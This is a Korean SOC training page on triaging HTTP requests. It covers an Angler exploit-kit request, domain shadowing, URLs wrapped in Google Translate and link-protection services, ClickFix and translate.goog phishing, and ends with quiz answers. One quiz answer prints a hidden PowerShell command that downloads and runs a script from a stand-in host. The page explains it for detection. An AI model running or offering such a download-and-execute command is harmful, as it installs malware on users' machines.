---
title: "요청 판정 연습 — 점검법, 익스플로잇 킷, URL 속 URL"
tags:
  - training
  - blue-team
  - http
  - analysis
---

# 요청 판정 연습 — 점검법, 익스플로잇 킷, URL 속 URL { #reading-requests }

!!! abstract "이 페이지에서 다루는 것"
    HTTP 요청을 칸마다 차례로 묻는 점검법(Host, User-Agent/Server, 경로, 내용, 그리고 판단이 어려운 Cookie), 무작위처럼 보이지만 정상인 문자열, 익스플로잇 킷(Angler) 요청을 한 줄씩 해부하기와 도메인 섀도잉, Referer 안에 숨은 URL(구글 번역, 링크 보호 서비스) 풀어 읽기, 그리고 2026년의 변화(ClickFix, `translate.goog` 피싱). 마지막에 확인 문제와 해설이 있습니다.

!!! note "표기"
    **[보충]** = 꼭 알아야 할 실무 보충, **[정정]** = 흔히 잘못 알려진 내용 정정, **[변경됨]**/**[주의]** = 최근 바뀐 점과 옛 방식대로 하면 위험한 점. 헤더 각각의 뜻은 [POST, 그 밖의 메서드, 요청 헤더](post-methods-headers.md#headers)에 있습니다.

## 한눈에 보는 핵심 10가지 { #key-points }

1. 감으로 보지 말고 칸마다 같은 순서로 묻는다: Host → User-Agent/Server → 경로 → 내용.
2. 수상함의 세 단어: **길다, 무작위다, 쓸데없이 인코딩됐다.** 정상 프로그램은 감출 이유가 없다.
3. User-Agent 질문은 세 단계: 세상에서 아는 것인가 → 우리 회사에서 흔한가 → **그 PC**에 맞는가(자산 목록과 함께).
4. Cookie는 원래 무작위처럼 생겼다. 내용보다 모양(이름=값 쌍인가, 이름 없는 Base64 덩어리인가)을 본다.
5. 무작위는 조사를 시작할 이유이지 결론이 아니다. 빌드 해시, 클라우드 서명 URL, 광고 추적 번호는 정상이다.
6. 헤더 대부분이 정상이어도 한두 칸이 결정적으로 이상하면 악성일 수 있다. 모든 칸을 빠짐없이 본다.
7. 드라이브 바이 다운로드에서 요청을 보내는 건 피해자의 **정상 브라우저**다. User-Agent가 정상이라고 안전한 게 아니다.
8. User-Agent 판단은 시대와 우리 회사 기준선에 따라 달라진다(2015년의 IE10은 정상, 2026년엔 수상).
9. "오래된 정상 도메인 + 처음 보는 무작위 서브도메인" = 도메인 섀도잉이나 도메인 관리 계정 탈취를 의심.
10. URL 안에 URL이 있으면 **안쪽이 진짜 목적지**다. 구글·마이크로소프트 도메인으로 감싸져 있어도 풀어서 평가한다.

## 칸마다 차례로 묻는 점검법 { #checklist }

**왜 필요한가.** HTTP 로그를 처음 보면 "뭔가 이상한데 뭐가 이상한지 모르겠다"에서 멈추기 쉽습니다. 처방은 간단합니다. **감이 아니라 칸마다 정해진 질문을 순서대로** 던지는 것입니다. 공항 보안 검색 요원이 매번 여권 → 탑승권 → 가방 → 몸 순서로 검사하는 것과 같습니다. 순서를 정해 두면 놓치는 칸이 없고, 판단 근거를 남에게 설명할 수 있습니다.

### ① Host — 안전해 보이는 도메인인가? { #check-host }

[DNS 도메인 신호](../dns/domain-signals.md)의 판단법(오른쪽부터 읽어 진짜 주인 찾기, 나이, 평판, 무작위 글자, TLD)을 그대로 적용합니다.

```
Host: www.microsoft.com                       ← known, old, reputable
Host: q8z3k1vt.shady-host.eu                  ← random-looking subdomain, unfamiliar domain
Host: microsoft-365-verify.support-desk.top   ← brand name in front, real owner support-desk.top
```

- 1줄: 정상
- 2줄: 서브도메인이 사람이 지은 이름이 아니라 기계가 만든 무작위 글자처럼 보임
- 3줄: 앞에 브랜드 이름을 붙였지만 진짜 주인은 `support-desk.top`. `.top`은 저렴해서 악용이 많은 TLD로 자주 꼽힘

### ② User-Agent(요청) / Server(응답) — 이 소프트웨어가 맞는가? { #check-software }

요청의 User-Agent와 응답의 Server는 둘 다 **대화 양쪽 끝에 어떤 프로그램이 있는지** 알려 주는 자기소개라서 한 묶음으로 봅니다. 질문은 세 단계입니다.

| 단계 | 질문 | 기준 |
| --- | --- | --- |
| 1 | 아는 프로그램인가? | 세상 기준 |
| 2 | 우리 네트워크에서 흔한가? | 우리 회사 기준선 |
| 3 | 우리가 쓰는 것이고, OS·버전이 맞는가? | **그 PC** 기준(자산 목록) |

`Chrome/141`은 1·2단계를 통과해도, 보낸 PC가 **크롬이 설치되지 않은 서버**라면 3단계에서 걸립니다. 응답의 Server도 같습니다. 회사 웹 서버 응답에 늘 `Server: Microsoft-IIS/10.0`이 오다가 갑자기 다른 값이 오면, 누군가 중간에 끼었거나 서버가 바뀐 것입니다. 반대로 외부 사이트가 `Server: nginx`라고 해서 안전하지는 않습니다. 공격자 서버도 대부분 NGINX나 Apache를 씁니다.

### ③ 경로 — 폴더·파일 이름과 파라미터가 수상하지 않은가? { #check-path }

```
/images/logo.png                                   ← normal
/PVfXBbR9WReNMmbQzLqrbDvNmen2ConnpC4tVP6U4RFI4HnE  ← long random string
/office365/secure/login/verify-account.php         ← phishing-style words
/wp-content/uploads/2026/10/invoice.pdf.exe        ← double extension, executable in uploads
/api/data?d=aG9zdD1hZG1pbi1QQzE=                   ← Base64 in a parameter
```

- 1줄: 평범함
- 2줄: 사람이 만든 경로로 보기 어려운 긴 무작위 문자열
- 3줄: `office365`, `secure`, `login`, `verify`처럼 사람을 안심시키는 단어를 잔뜩 붙인 피싱 경로
- 4줄: 업로드 폴더(그림이 있어야 할 곳)에 확장자 두 개를 붙인 실행 파일. 윈도우가 확장자를 숨기면 `invoice.pdf`로 보이는 속임수
- 5줄: 파라미터 속 Base64

### ④ 내용 — 필요 없는 인코딩 같은 이상한 점은 없는가? { #check-content }

기준은 세 단어입니다. **길다, 무작위다, 쓸데없이 인코딩됐다.** 정상 프로그램은 사람이나 다른 프로그램이 읽기 쉽게 데이터를 보냅니다. 감출 이유가 있는 쪽은 공격자입니다.

### 어려운 칸: Cookie { #check-cookie }

쿠키는 원래 길고 무작위처럼 보이는 값이라 위 기준이 그대로 통하지 않습니다. 그래서 내용보다 **모양**을 봅니다.

```
Cookie: session_id=8f3a91c2e7b44d0e; cart=2; lang=en      ← normal: named pairs
Cookie: aG9zdD1hZG1pbi1QQzEmb3M9V2luMTEmdXNlcj1qc21pdGg=  ← one unnamed Base64 blob
```

정상 쿠키는 보통 `이름=값`이 `;`로 이어진 꼴입니다. 이름 없는 Base64 덩어리 하나만 있거나, 처음 보는 도메인으로 갈 때마다 쿠키가 통째로 바뀌면 의심할 만합니다. C2 프레임워크(예: Cobalt Strike 기본 설정)가 감염 PC 정보를 이런 모양으로 쿠키에 싣습니다.

### [보충] 무작위처럼 보이지만 정상인 것들 { #random-but-normal }

점검법을 처음 익히면 모든 무작위 문자열이 악성으로 보입니다. 실무에서 오탐(False Positive)이 가장 많이 나는 지점입니다.

```
/static/js/main.3f9a2b7c.js                                      ← build hash in file name
/bucket/report.pdf?X-Amz-Signature=9c1e0b...&X-Amz-Expires=3600  ← cloud storage signed URL
/landing?gclid=Cj0KCQjw...&utm_source=google                     ← ad click tracking IDs
/watch?v=dQw4w9WgXcQ                                             ← video ID
```

| 줄 | 정체 |
| --- | --- |
| 1 | 웹사이트를 새로 만들 때마다 파일 이름에 붙이는 지문(빌드 해시). 브라우저가 옛 사본을 쓰지 않게 하는 정상 기법 |
| 2 | 클라우드 저장소의 "1시간만 유효한" 서명 URL |
| 3 | 광고 클릭 추적 번호 |
| 4 | 동영상 고유 번호 |

**무작위 글자 하나만으로 판정하지 말고, 도메인 평판·나이, 앞뒤 요청 흐름과 함께** 봅니다.

## 익스플로잇 킷 요청 해부: Angler { #exploit-kit }

### 익스플로잇 킷이란 { #what-is-ek }

<strong>"브라우저 해킹 자동 판매기"</strong>입니다. 사용자가 웹사이트에 들어가기만 하면 페이지가 브라우저와 플러그인(당시 Flash, Java, Silverlight, 인터넷 익스플로러) 버전을 몰래 확인하고, 맞는 취약점 공격을 골라 자동 실행해 클릭 없이 악성코드를 설치합니다(드라이브 바이 다운로드, Drive-by Download). Angler는 2013~2016년 가장 악명 높았던 익스플로잇 킷으로, 주로 랜섬웨어를 퍼뜨렸습니다.

```
1) User visits a legitimate but compromised site (or sees a malicious ad)
2) Hidden redirect/iframe sends the browser to the EK landing page
3) Landing page fingerprints the browser and plugins
4) Matching exploit is delivered (e.g. Flash, IE)
5) Payload (often ransomware) is downloaded and run
```

1. 평범한 사이트가 해킹당했거나 악성 광고가 걸림
2. 숨겨진 리디렉션으로 익스플로잇 킷의 첫 페이지(랜딩 페이지)로 이동
3. 랜딩 페이지가 브라우저를 검사
4. 맞는 공격 코드 전달
5. 최종 악성코드(흔히 랜섬웨어) 설치

### 요청 한 줄씩 읽기 { #ek-request }

Angler 감염 트래픽에서 흔히 보이던 모양의 요청입니다(도메인과 경로는 예시로 바꿨습니다). 2단계 랜딩 페이지를 거쳐 다음 단계로 넘어가는 요청입니다.

```
GET /PVfXBbR9WReNMmbQzLqrbDvNmen2ConnpC4tVP6U4RFI4HnE HTTP/1.1
Accept: text/html, application/xhtml+xml, */*
Referer: http://q8z3k1vt.shady-host.eu/38104p5h2c
Accept-Language: en-US
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)
Accept-Encoding: gzip, deflate
Host: q8z3k1vt.shady-host.eu
Connection: Keep-Alive
```

| 칸 | 판정 | 해설 |
| --- | --- | --- |
| 요청 줄(경로) | **수상** | 50글자가 넘는 무작위 경로. 익스플로잇 킷은 경로를 매번 새로 만들어 URL 목록 차단을 피했음 |
| `Accept` | 정상 | "HTML을 가장 원하지만 결국 아무 형식이나(`*/*`) 받겠다". 당시 IE의 평범한 값 |
| `Referer` | **수상** | 직전 페이지가 **같은 수상한 도메인**의 다른 경로 = 랜딩 페이지. "랜딩 페이지가 다음 단계를 불렀다"는 증거 |
| `Accept-Language` | 정상 | 미국 영어. 보통 보안과 관련이 적지만, 호주 회사라면 평소 `en-AU`와 다른 값은 작은 참고 단서 |
| `User-Agent` | 정상(당시) | IE10(`MSIE 10.0`, `Trident/6.0`) + 윈도우 7(`Windows NT 6.1`). 2015년엔 흔한 정상 브라우저 |
| `Accept-Encoding` | 정상 | 응답이 gzip·deflate로 **압축**될 수 있음. 패킷 캡처에서 파일을 직접 잘라 내면 압축된 덩어리가 나오므로 풀어야 원본이 나옴(Wireshark "Export Objects → HTTP" 등은 대부분 자동으로 풀어 줌) |
| `Host` | **수상** | 무작위 서브도메인 + 낯선 도메인 |
| `Connection` | 정상 | 같은 TCP 연결로 다음 파일도 받겠다는 성능용 헤더 |

**전체 URL 다시 만들기:** Host + 경로.

```
http://q8z3k1vt.shady-host.eu/PVfXBbR9WReNMmbQzLqrbDvNmen2ConnpC4tVP6U4RFI4HnE
```

### 이 요청에서 얻는 교훈 { #ek-lessons }

**1. 헤더 대부분이 정상이어도 악성일 수 있다.** 수상한 칸은 Host, 경로, Referer 셋뿐이고 나머지는 완벽하게 정상입니다. 그래서 모든 칸을 빠짐없이 봐야 합니다.

**2. User-Agent가 정상이라고 안전한 게 아니다.** 드라이브 바이 다운로드에서 요청을 보내는 주체는 악성코드가 아니라 **피해자의 정상 브라우저**입니다. 그리고 같은 문자열이라도 2026년이라면 "있을 수 없는 낡은 브라우저"가 됩니다. User-Agent 판단은 시대와 우리 회사 기준선에 따라 달라집니다.

**3. Referer를 거꾸로 따라가라.** 랜딩 페이지 요청(`/38104p5h2c`)의 Referer를 다시 보면, 사용자가 원래 방문한 **해킹당한 정상 사이트**가 나올 가능성이 큽니다. 그곳이 감염의 출발점이고, 같은 사이트를 방문한 다른 직원도 위험합니다.

### [보충] 도메인 섀도잉 { #domain-shadowing }

Angler는 **도메인 섀도잉**(Domain Shadowing)으로 유명했습니다(2015년 Cisco Talos가 크게 보고). 공격자가 정상 도메인 주인의 도메인 관리 계정(등록 업체 계정)을 피싱 등으로 훔친 뒤, 주인 몰래 **무작위 서브도메인을 수천 개** 만들어 자기 서버를 가리키게 하는 수법입니다.

- 부모 도메인은 오래되고 평판 좋은 진짜 도메인 → 평판 검사 통과
- 서브도메인은 계속 바뀜 → 목록 차단이 어려움

그래서 **"오래된 정상 도메인 + 처음 보는 무작위 서브도메인"** 조합은 지금도 확인할 가치가 있습니다. DNS 로그·Passive DNS로 그 서브도메인이 언제 처음 나타났는지, 그 도메인에 원래 이런 서브도메인이 있었는지 확인합니다.

## Referer 안에 숨은 URL { #url-in-url }

### 구글 번역을 거친 접속 { #translate-referer }

다음 요청을 보면 처음엔 이상합니다. 사용자는 지금 헝가리의 한 대학 사이트를 보고 있는데, 직전 페이지가 구글 번역이고, 그 주소 안에 **지금 보고 있는 사이트 주소가 또 들어 있습니다.**

```
GET /some/page.html HTTP/1.1
Host: www.example-egyetem.hu
Referer: http://translate.google.com/translate?hl=en&sl=hu&u=http://www.example-egyetem.hu/some/page.html&prev=search
```

"구글 번역이 사용자를 이 사이트로 보냈나? 구글 번역이 해킹당했나?" 싶지만, Referer도 [URL 해부](web-servers-urls-get.md#url)를 그대로 적용해 쪼개면 답이 나옵니다.

```
http://translate.google.com/translate   ← Google Translate's whole-page translation feature
?hl=en                                   ← translate INTO English
&sl=hu                                   ← source language: Hungarian
&u=http://www.example-egyetem.hu/...     ← the page to translate
&prev=search                             ← user came from a search result
```

**실제로 일어난 일:** 사용자가 헝가리어 사이트를 영어로 보려고 구글 번역의 "페이지 전체 번역"에 그 주소를 넣었습니다. 구글 번역 페이지가 열리고, 그 페이지가 원본 사이트의 내용(그림, 스크립트 등)을 다시 불러오면서 Referer에 구글 번역 주소가 찍혔습니다. 해킹도 이상한 이동도 아닌, 꽤 돌아가는 과정일 뿐입니다.

### 실무에서 매일 보는 "URL 속 URL" { #wrapped-urls }

분석가는 **바깥 URL이 아니라 안쪽 URL이 진짜 목적지**인 경우를 알아봐야 합니다.

```
https://www.google.com/url?q=https%3A%2F%2Fexample.org%2Fpage&sa=D
https://aus01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fevil.example%2Flogin&data=...
https://urldefense.com/v3/__https://evil.example/login__;!!...
```

| 서비스 | 진짜 목적지 위치 |
| --- | --- |
| 구글 리디렉션(검색 결과, 구글 문서 링크) | `q=` 뒤(`%3A`=`:`, `%2F`=`/`) |
| Microsoft 365 Safe Links(메일 링크를 감싸 클릭 순간 검사) | `url=` 뒤 |
| Proofpoint URL Defense | `__`와 `__` 사이 |

피싱 메일 조사 중 프록시 로그에 이런 주소가 잔뜩 나옵니다. **바깥 도메인(google, outlook, urldefense)만 보고 "정상 사이트"라고 넘기지 말고 안쪽 주소를 풀어서 봅니다.**

## 2026년 관점 { #trends }

!!! success "[2026 현재] 그대로 유효한 것"
    칸마다 차례로 묻는 점검법과 "길다, 무작위다, 쓸데없이 인코딩됐다" 기준은 지금도 가장 좋은 기본 습관입니다. "URL 속 URL을 풀어 보라"는 링크 보호 서비스가 일반화된 지금 오히려 더 중요해졌습니다.

!!! info "[변경됨] 바뀐 것"
    - **익스플로잇 킷 시대는 사실상 끝났습니다.** Angler는 2016년 6월 갑자기 사라졌고(러시아 Lurk 조직 체포와 함께 사라졌다고 널리 알려짐), Flash 지원 종료(2020년 말), 인터넷 익스플로러 은퇴(2022년), 브라우저 자동 업데이트·샌드박스 강화로 "방문만 해도 감염"은 매우 어려워졌습니다. 공격자는 **브라우저 대신 사람을 속이는** 쪽으로 옮겨 갔습니다.
        - **가짜 업데이트·가짜 설치 파일:** 해킹된 사이트의 "브라우저 업데이트 필요" 창(SocGholish 계열), 검색 광고·SEO 포이즈닝으로 받게 하는 가짜 설치 파일
        - **ClickFix(가짜 CAPTCHA·가짜 오류 수정):** 2024년부터 급증. "로봇이 아님을 확인하려면 Win+R → Ctrl+V → Enter"라고 안내하고, 그 사이 클립보드에 악성 PowerShell 명령을 몰래 복사해 둠. 사용자가 직접 악성 명령을 실행하므로 브라우저 취약점이 필요 없음
        - **트래픽 분배 시스템(TDS)과 클로킹(Cloaking):** 방문자가 보안 업체 스캐너인지, 실제 피해자 국가·기기인지 확인해서 피해자에게만 악성 페이지를 보여 줌. 익스플로잇 킷 "게이트"의 후손
    - 그래서 HTTP 분석도 "브라우저가 이상한 경로를 요청했다"보다 <strong>"브라우저가 아닌 프로그램(PowerShell, mshta, curl)이 웹에서 무언가를 받아 왔다"</strong>를 봐야 하는 경우가 많아졌습니다. [User-Agent 질문](#check-software)이 다시 핵심입니다.
    - **Referer에 긴 URL이 실리는 일은 줄었습니다.** 요즘 브라우저 기본 정책(strict-origin-when-cross-origin)은 다른 사이트로 넘어갈 때 Referer를 `https://translate.google.com/`처럼 도메인까지만 보냅니다. 구글 번역도 지금은 `www-example-egyetem-hu.translate.goog` 같은 **전용 프록시 도메인**에 번역 페이지를 띄웁니다. 규칙: 원래 도메인의 점(`.`)은 하이픈(`-`)으로, 원래 있던 하이픈은 이중 하이픈(`--`)으로 바꿔 `translate.goog` 앞에 붙임.

!!! warning "[주의] 지금 그대로 하면 틀리거나 위험한 것"
    - **번역·링크 보호 서비스는 피싱의 포장지로도 쓰입니다.** 여러 보안 업체가 `*.translate.goog`로 피싱 페이지를 감싸 보내는 수법을 보고했습니다. 바깥이 구글이라 메일 필터와 사용자 모두 안심하기 쉽습니다. Safe Links로 감싼 링크도 마찬가지입니다. 항상 **안쪽의 진짜 목적지**를 풀어서 평가합니다.
    - **"무작위 = 악성" 공식은 오탐을 부릅니다.** 빌드 해시, 클라우드 서명 URL, 광고 추적 번호 같은 정상 무작위 문자열이 계속 늘고 있습니다. 무작위는 조사를 시작할 이유이지 결론이 아닙니다.

## 확인 문제 { #quiz }

먼저 직접 답해 본 뒤 해설을 펼쳐 보세요.

### 문제 1

직원 PC에서 이 요청이 기록됐습니다. 직전 1분 안에 그 PC가 `captcha-verify-cdn.example`을 브라우저로 방문한 기록도 있습니다.

```
GET /c/run.txt HTTP/1.1
Host: captcha-verify-cdn.example
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-AU) WindowsPowerShell/5.1.26100.2161
```

(a) 이 요청을 보낸 프로그램은? (b) 점검 질문 중 어느 칸이 가장 결정적으로 걸리고 왜? (c) 의심되는 공격 수법과 호스트에서 확인할 것은?

??? success "정답과 해설"
    **(a) Windows PowerShell 5.1.** PowerShell의 웹 요청 명령(`Invoke-WebRequest`, `Invoke-RestMethod`, 줄여서 `iwr`, `irm`)이 기본으로 붙이는 User-Agent입니다. `Windows NT 10.0` = 윈도우 10/11, `en-AU` = PC의 지역 설정, `5.1.26100.2161` = PowerShell 버전(빌드 `26100`은 윈도우 11 24H2). 지역 설정이 실제 PC와 맞는다는 건 흉내 낸 값이 아니라 **그 PC에서 진짜 PowerShell이 실행됐다**는 뜻이기도 합니다.

    **(b) User-Agent.** "우리가 쓰는 소프트웨어인가?"에 정면으로 걸립니다. 일반 사무 PC에서 PowerShell이 외부 사이트로 직접 파일을 받으러 가는 일은 평소 거의 없습니다. 단서가 두 개 더 겹칩니다.

    - 1분 전 브라우저로 방문한 **바로 그 사이트**에 이번엔 PowerShell이 접속 → 웹 페이지가 사용자에게 무언가를 실행하게 했다는 강한 신호
    - `/c/run.txt` — `.txt`라 무해해 보이지만 PowerShell이 받아 가는 `.txt`는 보통 **다음 단계 스크립트**. 도메인 이름 `captcha-verify-cdn`도 "CAPTCHA 확인" 흉내

    **(c) ClickFix(가짜 CAPTCHA).** 사용자가 Win+R → Ctrl+V → Enter를 누르면 페이지가 몰래 복사해 둔 이런 명령이 실행됩니다.

    ```
    powershell -w hidden -c "irm https://captcha-verify-cdn.example/c/run.txt | iex"
    ```

    `-w hidden` = 창 숨기기, `irm ...` = 주소에서 글자를 받아 옴(이번 요청), `| iex`(Invoke-Expression) = 받아 온 글자를 **그대로 명령으로 실행**.

    호스트에서 확인할 것:

    1. **Sysmon Event ID 1 / 이벤트 4688** — 부모 **`explorer.exe`** → 자식 **`powershell.exe`**(실행 창 명령은 탐색기가 실행). 명령줄에 `irm`, `iwr`, `iex`, `-w hidden`, `-enc`(Base64 인코딩 명령)가 있는지
    2. **RunMRU 레지스트리** — `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`는 실행 창에 입력한 명령을 최근 순서로 기억. 붙여 넣은 명령이 그대로 남는 **ClickFix의 대표 흔적**
    3. **PowerShell 스크립트 블록 로그(이벤트 4104)** — `Microsoft-Windows-PowerShell/Operational`에 실제 실행된 스크립트 내용이 남음. 난독화해도 실행 직전의 풀린 모습이 남는 경우가 많아 `run.txt`가 무슨 일을 했는지 가장 잘 보여 줌. 그래서 공격자는 이 로그를 끄려고 하기도 함
    4. **Sysmon Event ID 3(네트워크 연결)·11(파일 생성)** — `powershell.exe`가 어디로 더 연결했고 어떤 파일을 떨어뜨렸는지
    5. **프록시 로그** — 같은 PC의 이후 요청을 시간 순서로

    **대응:** PC 격리. ClickFix로 많이 퍼지는 건 정보 탈취형 악성코드(Infostealer, 예: Lumma)이므로 저장된 비밀번호와 **로그인 쿠키**가 이미 빠져나갔다고 가정하고, 비밀번호 변경 + 모든 로그인 세션 종료. 쿠키를 훔치면 MFA도 소용없습니다([Cookie](post-methods-headers.md#cookie)).

### 문제 2

프록시 로그에 이 Host로 가는 요청이 있습니다.

```
Host: secure--login-micros0ft-com.translate.goog
```

(a) 구글 번역이 감싼 진짜 원본 사이트 주소는? (b) 공격자가 굳이 구글 번역을 거치게 만드는 이유와, 원본 도메인 자체의 수상한 점은?

??? success "정답과 해설"
    **(a) `secure-login.micros0ft.com`.** `.translate.goog`를 떼고 규칙을 거꾸로 적용합니다. **이중 하이픈을 먼저** 처리해야 합니다.

    ```
    secure--login-micros0ft-com
    secure[-]login-micros0ft-com   ← "--" back to "-" first
    secure-login.micros0ft.com     ← then single "-" back to "."
    ```

    **(b) 구글 번역을 거치게 하는 이유:**

    1. **바깥 도메인이 구글 소유** → 메일 필터, URL 평판 검사, 사용자 눈을 통과하기 쉬움. 인증서도 진짜 구글 인증서
    2. 피해자 회사 프록시 로그에는 `translate.goog`만 남음 → **풀어 보지 않으면 진짜 목적지를 놓침**
    3. 페이지 내용은 구글 서버가 원본에서 대신 가져와 보여 줌 → 원본 피싱 서버 입장에선 접속자가 피해자 IP가 아니라 구글 IP로 보여, 공격자 서버가 추적돼도 피해자 흔적이 드러나지 않음

    **원본 도메인의 수상한 점:** 오른쪽부터 읽으면 진짜 주인은 `micros0ft.com` — 알파벳 `o` 대신 **숫자 `0`**을 쓴 타이포스쿼팅(Typosquatting) 도메인. 앞의 `secure-login`은 안심시키려고 붙인 서브도메인.

    **SOC 대응:** `*.translate.goog` 요청은 Host를 원본으로 풀어서 평가하고, 브랜드 이름(microsoft, office, outlook, mygov, 은행 이름 등)이 섞이면 따로 알림. 차단은 `translate.goog` 전체가 아니라 **풀어낸 원본 도메인** 기준으로.

### 문제 3

다음 네 URL 중 무작위처럼 보이지만 정상일 가능성이 높은 것과 조사가 필요한 것을 나누고 이유를 말해 보세요.

```
A: https://shop.example.com/assets/app.9f3c21ab.js
B: http://x7qk2m9vtl.old-bakery-shop.com.au/Hn3kQz8LmPwR4tYvB2cXe9sJ0aFgD6uK
C: https://my-bucket.s3.ap-southeast-2.amazonaws.com/q3-report.pdf?X-Amz-Expires=3600&X-Amz-Signature=4b1f9e...
D: https://news.example.org/article?id=812&utm_source=newsletter&fbclid=IwAR2x...
```

??? success "정답과 해설"
    **정상 가능성 높음: A, C, D. 조사 필요: B.**

    | URL | 판정 | 이유 |
    | --- | --- | --- |
    | A | 정상 | 쇼핑몰이 **자기 도메인**에서 주는 JS 파일. `9f3c21ab`는 빌드 해시. 무작위 부분이 짧고 읽을 수 있는 이름(`assets`, `app`) 사이에 있음 |
    | C | 정상 가능성 높음(무조건 안전은 아님) | `X-Amz-Expires=3600` = 1시간 유효, `X-Amz-Signature` = AWS 서명. 흔한 정상 구조. 단 누구나 S3 계정을 만들 수 있어 공격자도 이런 링크를 보낼 수 있음 → 피싱 메일로 받은 처음 보는 버킷의 파일이면 **파일 자체를 확인**("평판 빌리기") |
    | D | 정상 | `utm_source` = 마케팅 추적 표시, `fbclid` = 페이스북 클릭 번호 |
    | B | **조사 필요** | 아래 참고 |

    **B가 수상한 이유:**

    1. `https`가 아닌 `http` — 2026년 정상 사이트는 거의 다 https
    2. 부모 도메인은 오래된 소규모 사업자(빵집) 도메인처럼 보이는데, 빵집이 `x7qk2m9vtl` 같은 무작위 서브도메인을 쓸 이유가 없음 → **"오래된 정상 도메인 + 처음 보는 무작위 서브도메인"** = [도메인 섀도잉](#domain-shadowing) 모양이거나 도메인 관리 계정 탈취 가능성
    3. 경로가 32글자 무작위 문자열 — [Angler 경로](#ek-request)와 같은 꼴

    **조사 방법:** DNS 로그·Passive DNS로 이 서브도메인이 **언제 처음 나타났는지**와 빵집 도메인에 원래 이런 서브도메인이 있었는지 확인 → 접속한 PC의 Referer를 거꾸로 따라가 어디서 왔는지(해킹된 다른 사이트, 메일, 광고) 찾기 → 그 PC가 이후 무엇을 받았는지 → 같은 주소에 접속한 다른 직원 찾기.

    **세 문제의 공통 교훈:** 겉모습이 아니라 진짜 정체를 풀어서 본다 — User-Agent로 진짜 실행 주체를(문제 1), 포장 안의 진짜 목적지를(문제 2), 무작위 모양이 아닌 맥락을(문제 3).
